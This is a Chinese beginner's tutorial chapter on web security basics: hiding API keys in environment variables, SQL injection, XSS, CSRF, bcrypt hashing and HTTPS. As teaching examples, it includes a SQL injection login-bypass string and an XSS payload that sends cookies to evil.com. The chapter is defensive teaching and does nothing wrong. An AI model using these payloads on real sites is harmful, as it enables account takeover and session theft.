# 第29章：安全基础

## 引言：你的应用是一座房子，安全就是门锁

想象你精心建造了一栋漂亮的房子（你的 Web 应用），里面存放着住户的贵重物品（用户数据）。如果你忘了装门锁、窗户大敞着，那不管房子多漂亮，都是在"裸奔"。

Web 安全不是大公司才需要考虑的事情。即使是一个小项目，只要涉及用户数据，安全就是你的责任。好消息是：**掌握基本的安全意识，就能防住 90% 的常见攻击。**

---

## 一、永远不要在代码中暴露 API Key

这是新手犯的最多、也最危险的错误。

### 类比

把 API Key（API 密钥）写在代码里，就像把家门钥匙贴在门上——方便是方便了，小偷也方便了。

### 错误示范

```javascript
// 千万别这样做！！！
const API_KEY = "sk-abc123secret456";
fetch(`https://api.openai.com/v1/chat?key=${API_KEY}`);
```

如果这段代码上传到 GitHub（即使是 Private 仓库），你的密钥就可能泄露。

### 正确做法：使用环境变量（Environment Variables）

**第一步：** 创建 `.env` 文件存放敏感信息

```
# .env 文件
OPENAI_API_KEY=sk-abc123secret456
DATABASE_URL=postgresql://user:password@localhost:5432/mydb
```

**第二步：** 在代码中读取环境变量

```javascript
// 从环境变量中读取，代码里看不到真实的 key
const apiKey = process.env.OPENAI_API_KEY;
```

**第三步：** 把 `.env` 加入 `.gitignore`，防止被上传

```
# .gitignore 文件
.env
.env.local
```

**提示：** 可以创建一个 `.env.example` 文件，列出需要的变量名（不含实际值），方便其他开发者知道需要配置哪些变量。

---

## 二、SQL 注入（SQL Injection）

### 类比

想象你去银行办业务，柜员问你："请问您要办什么业务？"你回答："取 100 元。顺便把隔壁账户的钱也转给我。"——如果银行系统不做检查，还真会执行这个"额外操作"。

### 它是什么

攻击者在输入框中填入恶意 SQL 代码，试图操控你的数据库。

```
用户名输入: admin' OR '1'='1
密码输入: 随便填

-- 如果代码直接拼接 SQL，就会变成：
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='随便填'
-- '1'='1' 永远为真，攻击者就绕过了登录验证！
```

### 防御方法：使用参数化查询（Parameterized Query）

```javascript
// 错误：直接拼接字符串
db.query(`SELECT * FROM users WHERE username='${username}'`);

// 正确：使用参数化查询，数据库会自动处理特殊字符
db.query('SELECT * FROM users WHERE username = $1', [username]);
```

现代的 ORM 框架（如 Prisma、Sequelize）默认就使用参数化查询，这也是推荐你使用框架的原因之一。

---

## 三、XSS（跨站脚本攻击，Cross-Site Scripting）

### 类比

你开了一个留言板，有人在留言内容里写了一段"魔法咒语"（恶意脚本）。其他用户查看这条留言时，"咒语"就在他们的浏览器里生效了——可能偷走他们的登录信息。

### 它是什么

攻击者在网页输入中注入 JavaScript 代码，当其他用户访问页面时，恶意脚本被执行。

```html
<!-- 攻击者在评论框输入 -->
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

### 防御方法

1. **对用户输入进行转义（Escape）：** 把 `<script>` 变成 `&lt;script&gt;`，浏览器就不会执行它
2. **使用框架自带的防护：** React、Vue 等前端框架默认会对内容进行转义
3. **设置 CSP（Content Security Policy，内容安全策略）：** 限制页面能加载和执行哪些脚本

```javascript
// React 默认安全——自动转义
<p>{userComment}</p>  // 即使 userComment 包含 <script>，也只会显示为文本

// 危险操作——除非你确定内容安全，否则不要用
<p dangerouslySetInnerHTML={{__html: userComment}} />
```

---

## 四、CSRF（跨站请求伪造，Cross-Site Request Forgery）

### 类比

你正在网上银行页面保持着登录状态。这时你打开了一个恶意网站，它偷偷向银行发送了一个"转账请求"。因为你的浏览器还带着银行的登录信息（Cookie），银行以为是你本人的操作。

### 防御方法

- 使用 CSRF Token（令牌）：每个表单包含一个随机生成的令牌，服务器验证令牌是否合法
- 检查请求的 `Referer` 和 `Origin` 头部信息
- 对关键操作（转账、修改密码）要求二次验证

---

## 五、密码存储：绝对不能存明文

### 类比

把用户密码直接存在数据库里，就像把所有住户的钥匙挂在物业公告栏上。一旦数据库泄露，所有人的密码都暴露了。

### 正确做法：哈希（Hashing）

```javascript
import bcrypt from 'bcrypt';

// 注册时：把密码哈希后存储
const hashedPassword = await bcrypt.hash('用户的密码', 10);
// 存储 hashedPassword 到数据库，而非原始密码

// 登录时：比较哈希值
const isMatch = await bcrypt.compare('用户输入的密码', hashedPassword);
```

哈希是**单向**的——你可以把密码变成哈希值，但无法从哈希值还原出密码。就像把鸡蛋打进碗里，你没法把蛋液变回完整的鸡蛋。

---

## 六、认证（Authentication）vs 授权（Authorization）

这两个概念经常被混淆，但它们解决的是不同的问题：

- **认证（Authentication）：** "你是谁？"——验证用户身份（登录过程）
- **授权（Authorization）：** "你能做什么？"——确认用户是否有权限执行某个操作

**类比：** 进公司大楼时刷工牌是**认证**（证明你是员工）；进入服务器机房需要额外权限是**授权**（并非所有员工都能进）。

即使用户通过了登录验证（认证），也不意味着他能访问所有数据（授权）。比如普通用户不应该能看到管理员面板。

---

## 七、HTTPS——给数据传输加密

HTTP 就像寄明信片——沿途任何人都能看到内容。HTTPS 就像寄密封信——只有收件人能拆开看。

- 现在几乎所有网站都应该使用 HTTPS
- 部署时使用 Let's Encrypt 可以免费获取 SSL 证书
- 如果你用 Vercel、Netlify 等平台部署，HTTPS 是自动启用的

---

## 八、实用安全检查清单

在项目上线前，逐项检查：

- [ ] 所有 API Key 和密码都存在环境变量中，未出现在代码里
- [ ] `.env` 文件已加入 `.gitignore`
- [ ] 使用参数化查询，避免 SQL 注入
- [ ] 对用户输入进行转义，防范 XSS
- [ ] 密码使用 bcrypt 等算法哈希存储
- [ ] 启用 HTTPS
- [ ] 敏感操作有权限验证（不只是前端隐藏按钮，后端也要检查）
- [ ] 依赖包定期更新（`npm audit` 检查已知漏洞）
- [ ] 错误信息不暴露系统内部细节给用户

---

## AI 辅助练习

1. **安全审查：** 把你之前写的项目代码发给 AI，问它："请帮我检查这段代码有没有安全漏洞"
2. **模拟攻击：** 向 AI 提问："如果我的表单没有做输入验证，攻击者可以怎么利用？请给出具体示例"
3. **安全加固：** 让 AI 帮你给项目添加环境变量配置和基本的输入验证

---

## 本章小结

- **API Key 永远不要写在代码里**，使用 `.env` 文件 + `.gitignore`
- SQL 注入、XSS、CSRF 是最常见的三种 Web 攻击，都有成熟的防御方案
- 密码必须**哈希存储**，绝对不能明文保存
- 认证（你是谁）和授权（你能做什么）是两个不同的概念
- HTTPS 是现代 Web 的标配，确保数据传输安全
- 安全不是一次性的工作，而是贯穿开发全过程的习惯
